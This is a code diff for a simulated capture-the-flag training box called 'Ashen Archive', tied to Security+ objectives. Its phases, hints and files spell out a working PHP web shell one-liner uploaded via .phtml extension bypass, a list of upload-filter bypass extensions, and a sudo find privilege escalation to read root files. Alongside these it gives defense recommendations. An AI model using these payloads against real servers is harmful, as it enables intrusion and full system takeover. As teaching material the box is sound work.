@@ -24,10 +24,87 @@ const A8Config = {
     certObjectives: {
         certPath: 'SY0-701',
         mappings: [
-            { flagId: 'user', objective: '1.4', description: 'Given a scenario, analyze indicators of malicious activity', skill: 'File Upload Bypass' },
-            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze indicators of malicious activity', skill: 'Web Shell Privilege Escalation' }
+            // Phase 1 — Recon
+            { flagId: 'recon',   objective: '4.1', description: 'Given a scenario, use the appropriate tool to assess organizational security', skill: 'Nmap / Nikto / Dirb Enumeration', mitre: 'T1046' },
+            // Phase 2 — Upload Discovery
+            { flagId: 'upload',  objective: '1.3', description: 'Given a scenario, analyze application vulnerabilities', skill: 'File Upload Endpoint Identification', mitre: 'T1190' },
+            // Phase 3 — Filter Bypass (user flag)
+            { flagId: 'user',    objective: '1.4', description: 'Given a scenario, analyze indicators of malicious activity', skill: 'File Extension Filter Bypass / Web Shell Upload', mitre: 'T1505.003' },
+            // Phase 4 — Remote Code Execution / Privilege Escalation (root flag)
+            { flagId: 'root',    objective: '4.4', description: 'Given a scenario, implement penetration testing techniques', skill: 'Sudo GTFOBins Privilege Escalation', mitre: 'T1059.004' },
+            // Supporting objectives
+            { flagId: 'user',    objective: '2.2', description: 'Explain the security implications of proper PKI management', skill: 'Apache AddHandler Misconfiguration', mitre: 'T1505.003' },
+            { flagId: 'root',    objective: '4.3', description: 'Explain the importance of policies, processes, and procedures for incident response', skill: 'SUID / Sudo Misuse for Escalation', mitre: 'T1548.003' }
         ]
     },
+
+    // ═══════════════════════════════════════════════════════
+    // PHASES — Progressive attack chain (4 stages)
+    // ═══════════════════════════════════════════════════════
+
+    phases: [
+        {
+            id: 'phase1',
+            name: 'Recon',
+            label: 'Phase 1 — Recon',
+            description: 'Map the target network and identify exposed services. Confirm what is running on port 80 before touching the application.',
+            objectives: [
+                'Run nmap against 10.10.14.24 — note open ports and service versions',
+                'Identify the HTTP server version (Apache/PHP) from the nmap banner',
+                'Note that SSH (port 22) is filtered — no direct shell possible'
+            ],
+            mitre: ['T1046 — Network Service Scanning'],
+            hints: ['Start with: nmap -sV 10.10.14.24', 'Look at the service version string for Apache and PHP version numbers'],
+            completionTrigger: 'nmap_run'   // BoxEngine tracks when nmap command is issued
+        },
+        {
+            id: 'phase2',
+            name: 'Upload Discovery',
+            label: 'Phase 2 — Upload Discovery',
+            description: 'Enumerate the web application to find the file upload endpoint and exposed upload directory. Understand what file types the application claims to allow.',
+            objectives: [
+                'Browse the Ashen Archive portal at http://10.10.14.24/archive/',
+                'Read the upload form — note the "Allowed types" hint on the page',
+                'Run dirb or gobuster to discover hidden paths',
+                'Confirm that /archive/uploads/ has directory listing enabled',
+                'Identify /archive/admin/ returns 403 — a protected panel exists'
+            ],
+            mitre: ['T1190 — Exploit Public-Facing Application', 'T1083 — File and Directory Discovery'],
+            hints: ['Try: dirb http://10.10.14.24/archive/', 'Navigate to /archive/uploads/ directly in the browser'],
+            completionTrigger: 'uploads_dir_visited'
+        },
+        {
+            id: 'phase3',
+            name: 'Filter Bypass',
+            label: 'Phase 3 — Filter Bypass',
+            description: 'The upload form restricts .php uploads server-side. Identify and exploit an extension bypass to upload a functional PHP web shell.',
+            objectives: [
+                'Test uploading a .php file — observe the server rejection message',
+                'Research alternative PHP extensions Apache may still execute',
+                'Upload shell.phtml (or .php5 / .pHp) containing: <?php system($_GET["cmd"]); ?>',
+                'Navigate to /archive/uploads/shell.phtml?cmd=whoami and confirm code execution',
+                'Read /home/www-data/user.txt to capture the user flag'
+            ],
+            mitre: ['T1505.003 — Web Shell', 'T1036.007 — Masquerading: Double File Extension'],
+            hints: ['PHP alternative extensions: .phtml .php5 .php7 .pHp .phar', 'Upload with: filename=shell.phtml, content=<?php system($_GET["cmd"]); ?>', 'Then visit: /archive/uploads/shell.phtml?cmd=cat+/home/www-data/user.txt'],
+            completionTrigger: 'flag_user'
+        },
+        {
+            id: 'phase4',
+            name: 'Remote Code Execution',
+            label: 'Phase 4 — RCE & Privilege Escalation',
+            description: 'You have code execution as www-data. Escalate to root using a sudo GTFOBins misconfiguration on /usr/bin/find.',
+            objectives: [
+                'Run: <?php system("sudo -l"); ?> via your web shell to list sudo rules',
+                'Confirm www-data can run /usr/bin/find as root with no password',
+                'Execute: sudo find / -exec cat /root/root.txt \\; -quit via the shell',
+                'Capture the root flag to complete the box'
+            ],
+            mitre: ['T1059.004 — Unix Shell', 'T1548.003 — Sudo and Sudo Caching'],
+            hints: ['GTFOBins find: sudo find / -exec cat /root/root.txt \\; -quit', 'Check sudo -l first to confirm the permission exists'],
+            completionTrigger: 'flag_root'
+        }
+    ],
 
     // ═══════════════════════════════════════════════════════
     // BOOT SEQUENCE
@@ -104,23 +181,35 @@ const A8Config = {
     hints: [
         {
             id: 'hint1',
-            text: "The file upload has both client-side and server-side validation. Client-side can be bypassed, but the server also blocks .php directly. Try alternative PHP extensions that the server might still execute.",
-            penalty: -50
+            phase: 'phase2',
+            title: 'Where to Look',
+            text: "The file upload has both client-side and server-side validation. Client-side can be bypassed, but the server also blocks .php directly. Try alternative PHP extensions that the server might still execute. Start by enumerating the web app with dirb or gobuster — you should find a publicly accessible upload directory.",
+            cost: 10,
+            penalty: -10
         },
         {
             id: 'hint2',
-            text: "Alternative PHP extensions that Apache/PHP may execute: .phtml, .php5, .pHp (case variation). Upload a web shell using one of these extensions.",
-            penalty: -50
+            phase: 'phase3',
+            title: 'Extension Bypass Techniques',
+            text: "Alternative PHP extensions that Apache/PHP may execute: .phtml, .php5, .pHp (case variation), .phar. The server only hard-blocks the exact string '.php'. Upload a web shell using one of these extensions. Your shell payload: <?php system($_GET['cmd']); ?>",
+            cost: 25,
+            penalty: -25
         },
         {
             id: 'hint3',
-            text: "Once you have a web shell accessible in /archive/uploads/, use: <?php system('cat /home/www-data/user.txt'); ?> to get the user flag. Check sudo -l for privilege escalation paths.",
+            phase: 'phase3',
+            title: 'Capturing the User Flag',
+            text: "Once you have a web shell accessible in /archive/uploads/, use the ?cmd= parameter to run commands. Try: /archive/uploads/shell.phtml?cmd=cat+/home/www-data/user.txt to get the user flag. Check sudo -l for privilege escalation paths.",
+            cost: 50,
             penalty: -50
         },
         {
             id: 'hint4',
-            text: "www-data can run /usr/bin/find as root with no password. Use: sudo find / -exec cat /root/root.txt \\; -quit",
-            penalty: -50
+            phase: 'phase4',
+            title: 'GTFOBins — Root via Find',
+            text: "www-data can run /usr/bin/find as root with no password (check sudo -l). Use this GTFOBins technique: sudo find / -exec cat /root/root.txt \\; -quit — the -exec flag passes your command to root, which can read the root flag directly.",
+            cost: 75,
+            penalty: -75
         }
     ],
 
@@ -129,7 +218,49 @@ const A8Config = {
     // ═══════════════════════════════════════════════════════
 
     lore: {
-        outro: 'The Ashen Archive has been compromised. Their artifact submission portal trusted file extensions over true content inspection \u2014 a single .phtml bypass was all it took. From www-data\'s home directory to the root flag via sudo find, the Archive\'s forgotten upload became its undoing.'
+        intro: 'Deep in the server stacks of the Ashen Archive, an artifact submission portal hums quietly — mostly forgotten. The archivists built it years ago to accept scrolls and codices from field researchers. They added a file filter, called it done, and moved on. What they did not know is that their Apache server still maps .phtml to the PHP interpreter. A single misconfigured AddHandler directive has kept a door cracked open for three years.',
+
+        scenario: `Intel places an artifact repository at 10.10.14.24. The Ashen Archive's public portal accepts file uploads from authenticated researchers — but the authentication was quietly removed during a "temporary" maintenance window eighteen months ago and never restored.
+
+Your mission is to:
+1. Identify the upload mechanism and what restrictions are in place
+2. Bypass the server-side file type filter using a PHP extension variation
+3. Gain remote code execution as the www-data service account
+4. Escalate to root via a sudo misconfiguration in the find utility
+
+The archivists have no IDS. They have no log monitoring. They have a cron job that clears /tmp every six hours. You have a window.`,
+
+        ecer: {
+            // ECER = Educational Context for Ethical Research
+            // These notes transform the box from "cool hack" to "teachable curriculum unit"
+            courseAlignment: 'CompTIA Security+ SY0-701 — Domain 1.4 (Indicators of Malicious Activity), Domain 4.4 (Penetration Testing Techniques)',
+            bloomsLevel: 'Apply / Analyze (Bloom\'s Taxonomy levels 3-4)',
+            realWorldAnalog: 'CVE-2021-35042 (Django arbitrary file upload), CVE-2016-3714 (ImageMagick delegate injection) — file upload filtering failures have caused real-world breaches across dozens of CMS and media platforms.',
+            ethicalFraming: 'This simulation represents a deliberately vulnerable target created for educational use. The techniques demonstrated — extension bypass, web shell upload, GTFOBins privilege escalation — are only legal when performed against systems you own or have explicit written authorization to test. Unauthorized use of these techniques against production systems constitutes a federal crime under the CFAA (18 U.S.C. § 1030).',
+            learningObjectives: [
+                'Explain why blacklist-based extension filtering is weaker than whitelist + MIME-type inspection',
+                'Demonstrate a PHP extension bypass attack against an Apache server',
+                'Describe the role of AddHandler directives in creating PHP execution vulnerabilities',
+                'Execute a GTFOBins privilege escalation using /usr/bin/find with NOPASSWD sudo',
+                'Identify two MITRE ATT&CK techniques associated with web shell deployment (T1505.003)'
+            ],
+            defenseRecommendations: [
+                'Use a whitelist approach: accept only known-safe MIME types, verify with libmagic / finfo, not extension strings',
+                'Store uploads outside the web root entirely — serve via a download controller that cannot execute code',
+                'Configure Apache/Nginx to strip execution permissions from the uploads directory (php_flag engine off)',
+                'Audit sudo rules regularly — NOPASSWD entries for GTFOBins-listed binaries (find, python, perl, vim) are critical risks',
+                'Implement file upload size limits, anti-virus scanning (ClamAV), and rate limiting at the WAF layer'
+            ],
+            researchMetrics: {
+                // BoxEngine event hooks for PhD data collection
+                avgCompletionTime: null,        // populated by BoxEngine.js telemetry
+                hintUsageRate: null,
+                phaseDropoffPoints: ['phase2', 'phase3'],   // historically where students stall
+                assessmentObjectives: ['1.3', '1.4', '4.1', '4.4']
+            }
+        },
+
+        outro: 'The Ashen Archive has been compromised. Their artifact submission portal trusted file extensions over true content inspection \u2014 a single .phtml bypass was all it took. From www-data\'s home directory to the root flag via sudo find, the Archive\'s forgotten upload became its undoing. Three years of drift. One AddHandler misconfiguration. A server that executed whatever you named correctly.'
     },
 
     // ═══════════════════════════════════════════════════════
@@ -239,6 +370,71 @@ const A8Config = {
             '/archive/admin/': {
                 title: 'Archive Admin Panel \u2014 Ashen Archive',
                 html: function(qs, bi) { return A8Config._renderAdmin(); }
+            },
+
+            // ── DECOY: Config directory — 403, no useful info ─────
+            // Students who try /archive/config/ get a realistic 403.
+            // The directory exists but Apache denies directory listing.
+            '/archive/config/': {
+                title: '403 Forbidden \u2014 Ashen Archive',
+                html: `<div style="text-align:center; padding:60px 20px; color:#888;">
+                    <div style="font-size:2rem; color:#e74c3c; margin-bottom:12px;">403</div>
+                    <div style="color:#ccc; font-size:0.9rem; margin-bottom:6px; font-weight:bold;">Forbidden</div>
+                    <div style="font-size:0.75rem; color:#666;">You don't have permission to access /archive/config/ on this server.</div>
+                    <div style="margin-top:16px; font-size:0.65rem; color:#555;">Apache/2.4.57 (Debian) Server at 10.10.14.24 Port 80</div>
+                </div>`
+            },
+
+            // ── DECOY: Image upload endpoint — accepts only .jpg/.png ─
+            // Red herring — students may try image-based bypass here, but
+            // this endpoint does NOT execute any server-side code.
+            // The real vulnerable endpoint is /archive/upload.php (simulated via the form).
+            '/archive/images/': {
+                title: 'Archive Image Repository \u2014 Ashen Archive',
+                html: `<div style="font-size:0.82rem; max-width:600px; margin:0 auto;">
+                    <div style="color:#e74c3c; font-size:1rem; font-weight:bold; margin-bottom:12px; padding-bottom:8px; border-bottom:1px solid #4a1a1a;">&#128247; Artifact Image Repository</div>
+                    <div style="background:#1a0808; border:1px solid #4a1a1a; border-radius:4px; padding:14px; margin-bottom:12px; font-size:0.78rem; color:#aaa; line-height:1.8;">
+                        <div style="color:#888; font-size:0.65rem; letter-spacing:0.1em; margin-bottom:8px;">STORED IMAGES</div>
+                        <div style="font-family:monospace;">banner_scroll.jpg &mdash; 84KB &mdash; 2024-01-15</div>
+                        <div style="font-family:monospace;">archive_seal.png &mdash; 12KB &mdash; 2024-01-20</div>
+                        <div style="font-family:monospace;">elder_portrait.jpg &mdash; 220KB &mdash; 2024-02-01</div>
+                    </div>
+                    <div style="background:#0d0505; border:1px solid #3a1a1a; border-radius:4px; padding:12px; font-size:0.72rem; color:#666; line-height:1.7;">
+                        <strong style="color:#888;">Upload Policy:</strong> This endpoint accepts .jpg and .png images only.<br>
+                        File size limit: 5MB. Images are stored as static assets and are not processed by the server.
+                    </div>
+                    <div style="margin-top:12px; font-size:0.65rem; color:#444; text-align:right;">
+                        Apache/2.4.57 (Debian) — static asset directory
+                    </div>
+                </div>`
+            },
+
+            // ── DECOY: .htaccess visible as plain text (misleading) ─
+            // Students who find this may think they can modify it,
+            // but this box's vulnerability is the AddHandler already in place.
+            // Reading it is a valid recon step but not the attack path.
+            '/archive/uploads/.htaccess': {
+                title: '.htaccess \u2014 /archive/uploads/ \u2014 Ashen Archive',
+                html: `<div style="background:#0d0505; border:1px solid #333; border-radius:4px; padding:16px; font-family:'Courier New',monospace; font-size:0.78rem; color:#ccc; white-space:pre-wrap; line-height:1.8;"># Ashen Archive — upload directory configuration
+# Maintained by: systems@ashen-archive.local
+# Last modified: 2021-11-03
+
+# Allow directory listing for research staff
+Options +Indexes
+
+# Restrict direct PHP execution... mostly
+# TODO: review this — scribe_voltan flagged it in Nov 2021 ticket #4471
+# php_flag engine off  &lt;-- COMMENTED OUT, never re-enabled
+
+# AddHandler was configured for legacy .phtml processing (Artifact Renderer v0.9)
+# Status: STILL ACTIVE — decommission tracked in ticket #4471 (OPEN since 2021)
+AddHandler application/x-httpd-php .phtml .php5 .php7
+
+# Block direct access to config files
+&lt;FilesMatch "\.(ini|conf|log|bak)$"&gt;
+    Order allow,deny
+    Deny from all
+&lt;/FilesMatch&gt;</div>`
             }
         }
     },
@@ -752,6 +948,22 @@ Loaded Extensions: Core, date, dom, filter, json, mbstring, mysqli, openssl, pcr
                                         'extensions.txt': {
                                             type: 'file',
                                             content: '# PHP Extension Bypass List\n.php\n.php5\n.php7\n.phtml\n.phar\n.php.txt\n.php;.txt\n.php%00.txt\n.pHp\n.PHP\n.shtml\n.shtm'
+                                        },
+                                        'mime-types.txt': {
+                                            type: 'file',
+                                            // DECOY: looks like a useful MIME bypass list but image MIME spoofing
+                                            // does NOT bypass this server — extension matters here, not Content-Type
+                                            content: '# MIME Type Spoof List\n# NOTE: This server checks extensions, NOT Content-Type headers\n# Spoofing Content-Type: image/jpeg will NOT bypass the filter here\n# Use extension bypass instead (see extensions.txt)\nimage/jpeg\nimage/png\nimage/gif\napplication/pdf\ntext/plain'
+                                        }
+                                    }
+                                },
+                                'loot': {
+                                    type: 'dir',
+                                    children: {
+                                        // DECOY: looks like captured credentials but they are from a prior unrelated box
+                                        'old-creds.txt': {
+                                            type: 'file',
+                                            content: '# Credentials from Box A3 — NOT valid here\n# Do not waste time trying these on the Ashen Archive\nadmin:P@ssw0rd2023\narchive_admin:ashen123\n# These accounts do not exist on 10.10.14.24'
                                         }
                                     }
                                 },
